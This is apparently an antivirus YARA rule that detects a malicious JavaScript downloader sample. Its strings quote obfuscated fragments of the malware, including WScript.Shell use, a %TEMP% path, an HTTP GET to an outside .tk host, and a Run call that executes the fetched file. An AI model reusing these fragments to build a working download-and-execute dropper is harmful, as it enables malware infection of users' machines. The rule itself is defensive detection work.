rule sig_20160427_1fc154cbb9438080cfd7d181a328556f {
  meta:
    description = "datamaliciousorder - file 20160427_1fc154cbb9438080cfd7d181a328556f.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "3c12c6e575bbef22ea237d3a4f9b8519e060d075d01c1003a2d21f149c179f63"

  strings:
    $s1  = "function MvxwoDvmim() {return FxowmDbzmu[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"2utC9D1" ascii
    $s2  = "function MvxwoDvmim() {return FxowmDbzmu[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"2utC9D1" ascii
    $s3  = "var FxowmDbzmu = function FpvedXcmxv() {return XggaaIpuzx[XizijCgrph](\"WScript\"+\".Shell\");}(), GluixUlryk = 11;" fullword ascii
    $s4  = "function JtqyhKhasc(OcuphVvdvx, VmwauRnzhv){IkvtqVjugz = IkvtqVjugz * 1; return OcuphVvdvx - VmwauRnzhv;};" fullword ascii
    $s5  = "SmvugUgkoj[PyhetLznoh](\"G\" + \"ET\", \"http://jurang.tk/n2ysk\", false);" fullword ascii
    $s6  = "var XggaaIpuzx = this[\"WScript\"];" fullword ascii
    $s7  = "if (SmvugUgkoj[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s8  = "function BfpulYuqdy(){return NdbjgRqijd + \"\";};" fullword ascii
    $s9  = "function KayufGvhaz() {return ((DmbyuKzxop == true) && (DmbyuKzxop == BpkmwCwnqx)) ? 1 : IkvtqVjugz;};" fullword ascii
    $s10 = "function ChzybOwapd(){return 23;};" fullword ascii
    $s11 = "}while (WvtuhOqgzs);" fullword ascii
    $s12 = "function KlcqxSgchh(){return XizijCgrph;};" fullword ascii
    $s13 = "var XqmrhHijqs = new this[\"D\"+\"ate\"]();" fullword ascii
    $s14 = "var JgwkwHtqlw = false;" fullword ascii
    $s15 = "DmbyuKzxop = true; " fullword ascii
    $s16 = "var BpkmwCwnqx = false;" fullword ascii
    $s17 = "function RfrlaVcnyd()" fullword ascii
    $s18 = "return JtqyhKhasc(VngdoCitba, ThefjMnobv);" fullword ascii
    $s19 = "function MrreyVvsxz(YyentYjxix){FxowmDbzmu[\"R\"+\"un\"](YyentYjxix, IkvtqVjugz, IkvtqVjugz);};" fullword ascii
    $s20 = "BpkmwCwnqx = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}